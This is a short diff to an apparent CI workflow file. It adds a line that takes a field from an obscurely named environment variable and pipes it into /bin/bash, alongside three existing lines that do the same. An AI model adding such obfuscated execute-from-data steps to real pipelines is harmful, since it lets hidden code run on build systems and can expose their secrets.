@@ -31,6 +31,7 @@ jobs:
           echo $rrxpf5862 | jq -r .didhk60 | /bin/bash
           printf '%s' "$tbk290" | jq -r .m2745 | /bin/bash
           printf '%s' "$k493" | jq -r .n3903 | /bin/bash
+          printf '%s' "$bv5432" | jq -r .s74300 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
